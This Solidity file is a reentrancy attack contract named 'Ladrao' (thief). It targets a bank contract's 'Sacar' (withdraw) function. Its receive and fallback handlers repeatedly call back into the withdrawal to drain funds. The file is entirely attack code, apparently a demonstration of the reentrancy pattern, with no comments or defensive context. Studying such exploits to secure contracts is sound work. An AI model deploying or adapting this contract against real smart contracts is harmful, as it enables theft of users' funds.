// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

interface Banco {
    function Sacar() external payable;
}

contract Ladrao {
    address public owner;

    Banco banco;

    constructor(address _endereco_alvo) {
        banco = Banco(_endereco_alvo);
        owner = msg.sender;
    }

    function Sacar() public payable {
        return banco.Sacar();
    }

    function Roubar() public {
        Sacar();
    }

    receive() external payable {
        Roubar();
    }

    fallback() external payable {
        Roubar();
    }
}
